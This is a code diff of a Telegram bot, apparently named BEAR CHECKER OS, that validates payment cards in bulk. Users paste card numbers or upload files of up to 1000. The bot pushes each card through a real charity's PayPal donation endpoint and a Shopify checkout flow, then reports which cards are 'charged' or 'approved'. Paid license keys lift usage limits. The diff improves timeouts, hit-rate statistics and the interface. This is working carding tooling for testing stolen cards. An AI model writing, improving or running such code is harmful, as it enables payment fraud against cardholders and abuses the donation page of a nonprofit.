@@ -39,7 +39,7 @@ dp.include_router(router)
 
 PREMIUM_FILE = "premium.json"
 KEYS_FILE = "keys.json"
-USAGE_FILE = "usage.json" # New daily usage tracker database
+USAGE_FILE = "usage.json" 
 ACTIVE_JOBS = {} 
 
 # --- DATABASE LOGIC ---
@@ -58,13 +58,12 @@ def check_tier(user_id):
     db = load_db(PREMIUM_FILE)
     if str(user_id) in db:
         expiry = datetime.fromisoformat(db[str(user_id)])
-        if datetime.now() < expiry: return "💎 PREMIUM"
+        if datetime.now() < expiry: return "🔑 KEY"
         else:
             del db[str(user_id)]
             save_db(PREMIUM_FILE, db)
     return "🆓 FREE"
 
-# --- USAGE LIMITER LOGIC ---
 def get_usage(user_id):
     db = load_db(USAGE_FILE)
     today = datetime.now().strftime("%Y-%m-%d")
@@ -84,10 +83,8 @@ def add_usage(user_id, check_type):
     save_db(USAGE_FILE, db)
 
 def can_use(user_id, check_type):
-    """Returns True if user is allowed to perform the check"""
     tier = check_tier(user_id)
-    if tier != "🆓 FREE": return True # Premium/Admin are unlimited
-    
+    if tier != "🆓 FREE": return True 
     usage = get_usage(user_id)
     if check_type == "single" and usage["single"] >= 10: return False
     if check_type == "mass" and usage["mass"] >= 1: return False
@@ -101,7 +98,7 @@ class AppStates(StatesGroup):
     waiting_for_paypal_mass = State()
     waiting_for_key = State()
 
-# --- PAYPAL GATEWAY LOGIC ---
+# --- PAYPAL GATEWAY LOGIC (WITH ANTI-HANG FIX) ---
 def check_cc_paypal(ccx):
     try:
         ccx = ccx.strip()
@@ -119,7 +116,8 @@ def check_cc_paypal(ccx):
             
         with session as r:
             headers_get = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': us}
-            response = r.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=20)
+            # Hard timeout set to 12 seconds to prevent endless loading
+            response = r.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=12)
             if 'cf-ray' in response.headers or 'Cloudflare' in response.text or response.status_code == 403:
                 return "ERROR", "Cloudflare Block"
             
@@ -155,7 +153,7 @@ def check_cc_paypal(ccx):
             
             headers_multipart = {'content-type': data_multipart.content_type, 'user-agent': us}
             params = {'action': 'give_paypal_commerce_create_order'}
-            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=20)
+            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=15)
             tok = response.json()['data']['id']
             
             headers_paypal = {
@@ -166,10 +164,10 @@ def check_cc_paypal(ccx):
                 'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}},
                 'application_context': {'vault': False}
             }
-            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data_paypal, timeout=20, verify=False)
+            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data_paypal, timeout=15, verify=False)
             
             params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
-            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=20, verify=False)
+            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=15, verify=False)
             text_up = response.text.upper()
 
             if any(k in text_up for k in ['APPROVESTATE":"APPROVED', 'PARENTTYPE":"AUTH', 'APPROVEGUESTPAYMENTWITHCREDITCARD', 'THANK YOU FOR DONATION', '"SUCCESS":TRUE']):
@@ -184,10 +182,12 @@ def check_cc_paypal(ccx):
                 try: return "DECLINED", str(response.json().get('data', {}).get('error', 'Transaction Failed'))
                 except: return "DECLINED", "Transaction Failed"
                 
+    except requests.exceptions.Timeout:
+        return "ERROR", "Gateway Timeout - No Response"
     except Exception as e:
         msg = str(e)
-        if "timeout" in msg.lower(): return "ERROR", "Read Timeout"
-        return "ERROR", f"Req Error: {msg[:30]}"
+        if "timeout" in msg.lower(): return "ERROR", "Gateway Timeout"
+        return "ERROR", f"Req Error: {msg[:20]}"
 
 # --- DYNAMIC UI MENUS ---
 def kb_home(user_id):
@@ -206,7 +206,7 @@ def kb_shopify():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💳 Single Check", callback_data="ui_shopify_single"),
          InlineKeyboardButton(text="📁 Mass Check", callback_data="ui_shopify_mass")],
-        [InlineKeyboardButton(text="🛑 Stop Mass Check", callback_data="cmd_stop")],
+        [InlineKeyboardButton(text="🛑 Stop Active Mass Check", callback_data="cmd_stop")],
         [InlineKeyboardButton(text="🔙 Back to Dashboard", callback_data="ui_home")]
     ])
 
@@ -214,23 +214,51 @@ def kb_paypal():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💳 Single Check", callback_data="ui_paypal_single"),
          InlineKeyboardButton(text="📁 Mass Check", callback_data="ui_paypal_mass")],
-        [InlineKeyboardButton(text="🛑 Stop Mass Check", callback_data="cmd_stop")],
+        [InlineKeyboardButton(text="🛑 Stop Active Mass Check", callback_data="cmd_stop")],
         [InlineKeyboardButton(text="🔙 Back to Dashboard", callback_data="ui_home")]
     ])
-
-def kb_back():
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return to Dashboard", callback_data="ui_home")]])
 
 def kb_admin():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🎟 Gen 1-Day", callback_data="gen_1d"), InlineKeyboardButton(text="🎟 Gen 7-Day", callback_data="gen_7d")],
         [InlineKeyboardButton(text="🎟 Gen 1-Month", callback_data="gen_30d"), InlineKeyboardButton(text="🎟 Gen Lifetime", callback_data="gen_life")],
-        [InlineKeyboardButton(text="🔙 Return to Dashboard", callback_data="ui_home")]
+        [InlineKeyboardButton(text="🔙 Back to Dashboard", callback_data="ui_home")]
     ])
 
 async def clean_chat(message: Message):
     try: await message.delete()
     except TelegramBadRequest: pass
+
+async def delete_after_delay(message: Message, delay: int):
+    await asyncio.sleep(delay)
+    try: await message.delete()
+    except: pass
+
+# --- MASS CHECK UI FORMATTER ---
+def format_mass_stats(job_id, gateway_name, checked, total, approved, charged, declined, errors, start_time, tier):
+    elapsed = time.time() - start_time
+    speed = checked / elapsed if elapsed > 0 else 0
+    hit_rate = ((approved + charged) / checked * 100) if checked > 0 else 0
+    status_icon = "🏁" if checked == total else "⏳"
+    
+    return (
+        f"<code>"
+        f"{status_icon} {gateway_name} MASS CHECK\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📦 Total    : {total} cards\n"
+        f"🔥 Charged  : {charged}\n"
+        f"✅ Approved : {approved}\n"
+        f"❌ Declined : {declined}\n"
+        f"⚠️ Errors   : {errors}\n"
+        f"📈 Hit Rate : {hit_rate:.1f}%\n"
+        f"⚡️ Speed    : {speed:.1f}/s\n"
+        f"⏱ Time     : {elapsed:.1f}s\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔑 Tier     : {tier}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"BY BEAR OS\n"
+        f"</code>"
+    )
 
 # --- MAIN DASHBOARD ---
 @router.message(Command("start"))
@@ -274,16 +302,18 @@ async def menu_paypal(callback: CallbackQuery):
 @router.callback_query(F.data == "ui_shopify_single")
 async def nav_shopify_single(callback: CallbackQuery, state: FSMContext):
     if not can_use(callback.from_user.id, "single"):
-        return await callback.answer("⛔️ DAILY LIMIT REACHED!\n\nFree users get 10 single checks per day. Redeem a premium key for unlimited checks.", show_alert=True)
-    await callback.message.edit_text("🟢 <b>SHOPIFY: SINGLE CHECK</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card below.\nFormat: <code>CC|MM|YYYY|CVV</code>", reply_markup=kb_back())
+        return await callback.answer("⛔️ LIMIT REACHED!\nRedeem a key for unlimited checks.", show_alert=True)
+    
+    # We leave the back button here ONLY for the input phase so they can cancel
+    await callback.message.edit_text("🟢 <b>SHOPIFY: SINGLE CHECK</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card below.\nFormat: <code>CC|MM|YYYY|CVV</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await state.set_state(AppStates.waiting_for_shopify)
     await callback.answer()
 
 @router.callback_query(F.data == "ui_shopify_mass")
 async def nav_shopify_mass(callback: CallbackQuery, state: FSMContext):
     if not can_use(callback.from_user.id, "mass"):
-        return await callback.answer("⛔️ DAILY LIMIT REACHED!\n\nFree users get 1 mass check per day. Redeem a premium key to remove limits.", show_alert=True)
-    await callback.message.edit_text("🟢 <b>SHOPIFY: MASS CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease upload a <code>.txt</code> file containing your cards.\n<i>Format: CC|MM|YYYY|CVV</i>", reply_markup=kb_back())
+        return await callback.answer("⛔️ LIMIT REACHED!\nRedeem a key for unlimited mass checks.", show_alert=True)
+    await callback.message.edit_text("🟢 <b>SHOPIFY: MASS CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease upload a <code>.txt</code> file containing your cards.\n<i>Format: CC|MM|YYYY|CVV</i>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await state.set_state(AppStates.waiting_for_shopify_mass)
     await callback.answer()
 
@@ -294,19 +324,18 @@ async def process_shopify(message: Message, state: FSMContext):
     try: parts = parse_cc_string(card_data)
     except ValueError:
         err = await message.answer("⚠️ <b>Invalid Format.</b> Use CC|MM|YYYY|CVV")
-        await asyncio.sleep(2)
-        await err.delete()
+        asyncio.create_task(delete_after_delay(err, 3))
         return
 
-    add_usage(message.from_user.id, "single") # Tick the counter
+    add_usage(message.from_user.id, "single")
 
     data = await state.get_data()
     if data.get("dash_id"):
         try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
         except: pass
 
-    loading = await message.answer(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: Shopify Auto", reply_markup=kb_back())
-    await state.update_data(dash_id=loading.message_id)
+    # NO BUTTONS on the loading or result screen! Clean text only.
+    loading = await message.answer(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: Shopify Auto")
 
     try:
         success, raw_message, gateway, price, currency = await process_card_async(parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com", proxy_str=None)
@@ -314,15 +343,19 @@ async def process_shopify(message: Message, state: FSMContext):
         clean_msg = extract_clean_response(raw_message)
         if category == 'charged': clean_msg = 'ORDER_PLACED'
 
-        status_emoji = "🔥 <b>CHARGED</b>" if category == 'charged' else "✅ <b>APPROVED</b>" if category == 'approved' else "❌ <b>DECLINED</b>"
-        result_text = (f"{status_emoji}\n━━━━━━━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{card_data}</code>\nツ <b>Response:</b> <code>{clean_msg}</code>\nキ <b>Gateway:</b> {gateway or 'Shopify'}\n━━━━━━━━━━━━━━━━━━\n<i>Powered by BEAR OS</i>")
-        await loading.edit_text(result_text, reply_markup=kb_back())
-    except Exception as e:
-        await loading.edit_text(f"⚠️ <b>Error:</b> {str(e)}", reply_markup=kb_back())
+        status_emoji = "✅ <b>APPROVED</b>" if category == 'approved' else "❌ <b>DECLINED</b>"
+        if category == 'charged': status_emoji = "🔥 <b>CHARGED</b>"
 
-    dash_id = (await state.get_data()).get("dash_id")
+        result_text = (f"{status_emoji}\n━━━━━━━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{card_data}</code>\nツ <b>Response:</b> <code>{clean_msg}</code>\nキ <b>Gateway:</b> {gateway or 'Shopify'}\n━━━━━━━━━━━━━━━━━━\n<i>Powered by BEAR OS</i>")
+        await loading.edit_text(result_text)
+    except Exception as e:
+        await loading.edit_text(f"⚠️ <b>Error:</b> {str(e)}")
+
     await state.clear()
-    if dash_id: await state.update_data(dash_id=dash_id)
+    # Respawn a fresh dashboard below the result
+    tier = check_tier(message.from_user.id)
+    new_dash = await message.answer(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nWelcome, <b>{message.from_user.first_name}</b>.\nAccess Level: {tier}\n\n<i>Select a gateway below:</i>", reply_markup=kb_home(message.from_user.id))
+    await state.update_data(dash_id=new_dash.message_id)
 
 @router.message(AppStates.waiting_for_shopify_mass, F.document)
 async def process_shopify_mass_file(message: Message, state: FSMContext):
@@ -336,31 +369,30 @@ async def process_shopify_mass_file(message: Message, state: FSMContext):
     file_id = message.document.file_id
     file_info = await bot.get_file(file_id)
     downloaded = await bot.download_file(file_info.file_path)
-    
     ccs = downloaded.read().decode('utf-8').splitlines()
     ccs = [l.strip() for l in ccs if l.strip()]
     
-    # Enforce limitations based on tier
     tier = check_tier(user_id)
-    if tier == "🆓 FREE":
-        if len(ccs) > 30:
-            ccs = ccs[:30]
-            warning = await message.answer("⚠️ <b>Free Tier Notice:</b> Mass check limited to 30 cards per file. Upgrading to Premium removes limits.")
-            asyncio.create_task(delete_after_delay(warning, 5))
-    else:
-        if len(ccs) > 1000: ccs = ccs[:1000]
+    if tier == "🆓 FREE" and len(ccs) > 30:
+        ccs = ccs[:30]
+        warning = await message.answer("⚠️ <b>Free Tier Notice:</b> Mass check limited to 30 cards.")
+        asyncio.create_task(delete_after_delay(warning, 4))
+    elif len(ccs) > 1000: ccs = ccs[:1000]
 
-    add_usage(user_id, "mass") # Tick the counter
+    add_usage(user_id, "mass")
     job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:6].upper()
     ACTIVE_JOBS[job_id] = True
     total = len(ccs)
-    prog_msg = await message.answer(f"🚀 <b>Shopify Mass Check Running</b> [ID: {job_id}]\nChecked: 0/{total}\n🔥 Charged: 0 | ✅ Approved: 0", reply_markup=kb_back())
-    await state.update_data(dash_id=prog_msg.message_id)
+    start_time = time.time()
+    
+    # Send initial clean UI
+    prog_text = format_mass_stats(job_id, "SHOPIFY", 0, total, 0, 0, 0, 0, start_time, tier)
+    prog_msg = await message.answer(prog_text)
 
-    checked, approved, charged, declined = 0, 0, 0, 0
+    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
     
     async def process_single_shopify(cc):
-        nonlocal checked, approved, charged, declined
+        nonlocal checked, approved, charged, declined, errors
         if not ACTIVE_JOBS.get(job_id): return
         try:
             parts = parse_cc_string(cc)
@@ -372,13 +404,15 @@ async def process_shopify_mass_file(message: Message, state: FSMContext):
             checked += 1
             if category == "charged": charged += 1
             elif category == "approved": approved += 1
-            else: declined += 1
+            elif category == "declined": declined += 1
+            else: errors += 1
             
             if category in ["charged", "approved"]:
-                await message.answer(f"✅ <b>Hit!</b>\nCard: <code>{cc}</code>\nRes: <code>{clean_msg}</code>")
+                icon = "🔥" if category == "charged" else "✅"
+                await message.answer(f"{icon} <b>Hit!</b>\nCard: <code>{cc}</code>\nRes: <code>{clean_msg}</code>")
         except Exception:
             checked += 1
-            declined += 1
+            errors += 1
 
     sem = asyncio.Semaphore(5)
     async def sem_task(cc):
@@ -392,30 +426,30 @@ async def process_shopify_mass_file(message: Message, state: FSMContext):
             await asyncio.gather(*tasks)
             tasks = []
             if ACTIVE_JOBS.get(job_id) and checked % 10 == 0:
-                try: await prog_msg.edit_text(f"🚀 <b>Shopify Mass Check Running</b> [ID: {job_id}]\nChecked: {checked}/{total}\n🔥 Charged: {charged} | ✅ Approved: {approved}", reply_markup=kb_back())
+                try: await prog_msg.edit_text(format_mass_stats(job_id, "SHOPIFY", checked, total, approved, charged, declined, errors, start_time, tier))
                 except: pass
 
     ACTIVE_JOBS.pop(job_id, None)
-    await prog_msg.edit_text(f"🏁 <b>Shopify Mass Check Finished</b>\nChecked: {checked}/{total}\n🔥 Charged: {charged}\n✅ Approved: {approved}\n❌ Declined: {declined}", reply_markup=kb_back())
-    dash_id = (await state.get_data()).get("dash_id")
+    await prog_msg.edit_text(format_mass_stats(job_id, "SHOPIFY", checked, total, approved, charged, declined, errors, start_time, tier))
+    
     await state.clear()
-    if dash_id: await state.update_data(dash_id=dash_id)
-
+    new_dash = await message.answer(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nWelcome, <b>{message.from_user.first_name}</b>.\nAccess Level: {tier}\n\n<i>Select a gateway below:</i>", reply_markup=kb_home(message.from_user.id))
+    await state.update_data(dash_id=new_dash.message_id)
 
 # --- PAYPAL MODULES ---
 @router.callback_query(F.data == "ui_paypal_single")
 async def nav_paypal_single(callback: CallbackQuery, state: FSMContext):
     if not can_use(callback.from_user.id, "single"):
-        return await callback.answer("⛔️ DAILY LIMIT REACHED!\n\nFree users get 10 single checks per day. Redeem a premium key for unlimited checks.", show_alert=True)
-    await callback.message.edit_text("🔵 <b>PAYPAL: SINGLE CHECK</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card below.\nFormat: <code>CC|MM|YYYY|CVV</code>", reply_markup=kb_back())
+        return await callback.answer("⛔️ LIMIT REACHED!\nRedeem a key for unlimited checks.", show_alert=True)
+    await callback.message.edit_text("🔵 <b>PAYPAL: SINGLE CHECK</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card below.\nFormat: <code>CC|MM|YYYY|CVV</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await state.set_state(AppStates.waiting_for_paypal)
     await callback.answer()
 
 @router.callback_query(F.data == "ui_paypal_mass")
 async def nav_paypal_mass(callback: CallbackQuery, state: FSMContext):
     if not can_use(callback.from_user.id, "mass"):
-        return await callback.answer("⛔️ DAILY LIMIT REACHED!\n\nFree users get 1 mass check per day. Redeem a premium key to remove limits.", show_alert=True)
-    await callback.message.edit_text("🔵 <b>PAYPAL: MASS CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease upload a <code>.txt</code> file containing your cards.\n<i>Format: CC|MM|YYYY|CVV</i>", reply_markup=kb_back())
+        return await callback.answer("⛔️ LIMIT REACHED!\nRedeem a key for unlimited mass checks.", show_alert=True)
+    await callback.message.edit_text("🔵 <b>PAYPAL: MASS CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease upload a <code>.txt</code> file containing your cards.\n<i>Format: CC|MM|YYYY|CVV</i>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await state.set_state(AppStates.waiting_for_paypal_mass)
     await callback.answer()
 
@@ -423,29 +457,39 @@ async def nav_paypal_mass(callback: CallbackQuery, state: FSMContext):
 async def process_paypal(message: Message, state: FSMContext):
     await clean_chat(message)
     card_data = message.text.strip()
-    
-    add_usage(message.from_user.id, "single") # Tick the counter
+    try: parts = parse_cc_string(card_data)
+    except ValueError:
+        err = await message.answer("⚠️ <b>Invalid Format.</b> Use CC|MM|YYYY|CVV")
+        asyncio.create_task(delete_after_delay(err, 3))
+        return
 
+    add_usage(message.from_user.id, "single")
     data = await state.get_data()
     if data.get("dash_id"):
         try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
         except: pass
 
-    loading = await message.answer(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: PayPal Braintree", reply_markup=kb_back())
-    await state.update_data(dash_id=loading.message_id)
+    # NO BUTTONS on the loading screen
+    loading = await message.answer(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: PayPal Braintree")
 
-    status, response = await asyncio.to_thread(check_cc_paypal, card_data)
+    try:
+        # We wrap in asyncio.wait_for as a final safety net against hanging
+        status, response = await asyncio.wait_for(asyncio.to_thread(check_cc_paypal, card_data), timeout=25)
+    except asyncio.TimeoutError:
+        status, response = "ERROR", "Gateway Timeout - No Response"
+
     status_emoji = "🔥 <b>CHARGED</b>" if status == "CHARGED" else "✅ <b>APPROVED</b>" if status == "APPROVED" else "❌ <b>DECLINED</b>"
 
     async with aiohttp.ClientSession() as session:
         brand, bank, country, level, type_cc, flag = await get_bin_info(session, card_data.split('|')[0][:6])
 
     result_text = (f"{status_emoji}\n━━━━━━━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{card_data}</code>\nツ <b>Response:</b> <code>{response}</code>\nキ <b>Gateway:</b> PayPal Braintree\n零 <b>Info:</b> {fmt_info(brand, type_cc, level)}\n━━━━━━━━━━━━━━━━━━\n<i>Powered by BEAR OS</i>")
-    await loading.edit_text(result_text, reply_markup=kb_back())
+    await loading.edit_text(result_text)
 
-    dash_id = (await state.get_data()).get("dash_id")
     await state.clear()
-    if dash_id: await state.update_data(dash_id=dash_id)
+    tier = check_tier(message.from_user.id)
+    new_dash = await message.answer(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nWelcome, <b>{message.from_user.first_name}</b>.\nAccess Level: {tier}\n\n<i>Select a gateway below:</i>", reply_markup=kb_home(message.from_user.id))
+    await state.update_data(dash_id=new_dash.message_id)
 
 @router.message(AppStates.waiting_for_paypal_mass, F.document)
 async def process_paypal_mass_file(message: Message, state: FSMContext):
@@ -459,40 +503,44 @@ async def process_paypal_mass_file(message: Message, state: FSMContext):
     file_id = message.document.file_id
     file_info = await bot.get_file(file_id)
     downloaded = await bot.download_file(file_info.file_path)
-    
     ccs = downloaded.read().decode('utf-8').splitlines()
     ccs = [l.strip() for l in ccs if l.strip()]
     
-    # Enforce limitations based on tier
     tier = check_tier(user_id)
-    if tier == "🆓 FREE":
-        if len(ccs) > 30:
-            ccs = ccs[:30]
-            warning = await message.answer("⚠️ <b>Free Tier Notice:</b> Mass check limited to 30 cards per file. Upgrading to Premium removes limits.")
-            asyncio.create_task(delete_after_delay(warning, 5))
-    else:
-        if len(ccs) > 1000: ccs = ccs[:1000]
+    if tier == "🆓 FREE" and len(ccs) > 30:
+        ccs = ccs[:30]
+        warning = await message.answer("⚠️ <b>Free Tier Notice:</b> Mass check limited to 30 cards.")
+        asyncio.create_task(delete_after_delay(warning, 4))
+    elif len(ccs) > 1000: ccs = ccs[:1000]
 
-    add_usage(user_id, "mass") # Tick the counter
+    add_usage(user_id, "mass")
     job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:6].upper()
     ACTIVE_JOBS[job_id] = True
-    
     total = len(ccs)
-    prog_msg = await message.answer(f"🚀 <b>PayPal Mass Check Running</b> [ID: {job_id}]\nChecked: 0/{total}\n🔥 Charged: 0 | ✅ Approved: 0", reply_markup=kb_back())
-    await state.update_data(dash_id=prog_msg.message_id)
+    start_time = time.time()
+    
+    prog_text = format_mass_stats(job_id, "PAYPAL", 0, total, 0, 0, 0, 0, start_time, tier)
+    prog_msg = await message.answer(prog_text)
 
-    checked, approved, charged, declined = 0, 0, 0, 0
+    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
     
     async def process_single(cc):
-        nonlocal checked, approved, charged, declined
+        nonlocal checked, approved, charged, declined, errors
         if not ACTIVE_JOBS.get(job_id): return
-        status, response = await asyncio.to_thread(check_cc_paypal, cc)
+        try:
+            status, response = await asyncio.wait_for(asyncio.to_thread(check_cc_paypal, cc), timeout=25)
+        except asyncio.TimeoutError:
+            status, response = "ERROR", "Timeout"
+
         checked += 1
         if status == "CHARGED": charged += 1
         elif status == "APPROVED": approved += 1
-        else: declined += 1
+        elif status == "DECLINED": declined += 1
+        else: errors += 1
+        
         if status in ["CHARGED", "APPROVED"]:
-            await message.answer(f"✅ <b>Hit!</b>\nCard: <code>{cc}</code>\nRes: {response}")
+            icon = "🔥" if status == "CHARGED" else "✅"
+            await message.answer(f"{icon} <b>Hit!</b>\nCard: <code>{cc}</code>\nRes: <code>{response}</code>")
 
     sem = asyncio.Semaphore(5)
     async def sem_task(cc):
@@ -506,22 +554,17 @@ async def process_paypal_mass_file(message: Message, state: FSMContext):
             await asyncio.gather(*tasks)
             tasks = []
             if ACTIVE_JOBS.get(job_id) and checked % 10 == 0:
-                try: await prog_msg.edit_text(f"🚀 <b>PayPal Mass Check Running</b> [ID: {job_id}]\nChecked: {checked}/{total}\n🔥 Charged: {charged} | ✅ Approved: {approved}", reply_markup=kb_back())
+                try: await prog_msg.edit_text(format_mass_stats(job_id, "PAYPAL", checked, total, approved, charged, declined, errors, start_time, tier))
                 except: pass
 
     ACTIVE_JOBS.pop(job_id, None)
-    await prog_msg.edit_text(f"🏁 <b>PayPal Mass Check Finished</b>\nChecked: {checked}/{total}\n🔥 Charged: {charged}\n✅ Approved: {approved}\n❌ Declined: {declined}", reply_markup=kb_back())
-    dash_id = (await state.get_data()).get("dash_id")
+    await prog_msg.edit_text(format_mass_stats(job_id, "PAYPAL", checked, total, approved, charged, declined, errors, start_time, tier))
+    
     await state.clear()
-    if dash_id: await state.update_data(dash_id=dash_id)
-
+    new_dash = await message.answer(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nWelcome, <b>{message.from_user.first_name}</b>.\nAccess Level: {tier}\n\n<i>Select a gateway below:</i>", reply_markup=kb_home(message.from_user.id))
+    await state.update_data(dash_id=new_dash.message_id)
 
 # --- GENERAL UTILITIES ---
-async def delete_after_delay(message: Message, delay: int):
-    await asyncio.sleep(delay)
-    try: await message.delete()
-    except: pass
-
 @router.callback_query(F.data == "cmd_stop")
 async def stop_mass(callback: CallbackQuery):
     if check_tier(callback.from_user.id) == "🆓 FREE": 
@@ -531,7 +574,7 @@ async def stop_mass(callback: CallbackQuery):
 
 @router.callback_query(F.data == "ui_redeem")
 async def nav_redeem(callback: CallbackQuery, state: FSMContext):
-    await callback.message.edit_text("🔑 <b>KEY REDEMPTION</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease paste your license key in the chat.", reply_markup=kb_back())
+    await callback.message.edit_text("🔑 <b>KEY REDEMPTION</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease paste your license key in the chat.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await state.set_state(AppStates.waiting_for_key)
     await callback.answer()
 
@@ -564,7 +607,7 @@ async def process_key(message: Message, state: FSMContext):
     success = await message.answer(f"🎉 <b>Redeemed!</b> You have Premium until {expiry.strftime('%Y-%m-%d')}")
     await state.clear()
     
-    new_dash = await message.answer(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nAccess Level: 💎 PREMIUM\n\n<i>Select a gateway below:</i>", reply_markup=kb_home(message.from_user.id))
+    new_dash = await message.answer(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nAccess Level: 🔑 KEY\n\n<i>Select a gateway below:</i>", reply_markup=kb_home(message.from_user.id))
     await state.update_data(dash_id=new_dash.message_id)
     asyncio.create_task(delete_after_delay(success, 4))
 
@@ -581,7 +624,7 @@ async def nav_plan(callback: CallbackQuery):
         usage = get_usage(callback.from_user.id)
         usage_text = f"\n<b>Daily Single Checks:</b> {usage['single']}/10\n<b>Daily Mass Checks:</b> {usage['mass']}/1\n"
 
-    await callback.message.edit_text(f"👤 <b>USER PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n\n<b>Telegram ID:</b> <code>{callback.from_user.id}</code>\n<b>Access Level:</b> {tier}\n<b>Expires On:</b> <code>{expiry_text}</code>\n{usage_text}\n<i>To upgrade, click Redeem Key.</i>", reply_markup=kb_back())
+    await callback.message.edit_text(f"👤 <b>USER PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n\n<b>Telegram ID:</b> <code>{callback.from_user.id}</code>\n<b>Access Level:</b> {tier}\n<b>Expires On:</b> <code>{expiry_text}</code>\n{usage_text}\n<i>To upgrade, click Redeem Key.</i>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await callback.answer()
 
 @router.callback_query(F.data == "ui_admin")
@@ -598,7 +641,7 @@ async def admin_gen(callback: CallbackQuery):
     db = load_db(KEYS_FILE)
     db[new_key] = duration
     save_db(KEYS_FILE, db)
-    await callback.message.edit_text(f"🎟 <b>LICENSE CREATED</b>\n━━━━━━━━━━━━━━━━━━\n\n<b>Key:</b> <code>{new_key}</code>\n<b>Duration:</b> {duration.upper()}\n\n<i>Tap the key to copy it.</i>", reply_markup=kb_back())
+    await callback.message.edit_text(f"🎟 <b>LICENSE CREATED</b>\n━━━━━━━━━━━━━━━━━━\n\n<b>Key:</b> <code>{new_key}</code>\n<b>Duration:</b> {duration.upper()}\n\n<i>Tap the key to copy it.</i>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await callback.answer()
 
 async def main():
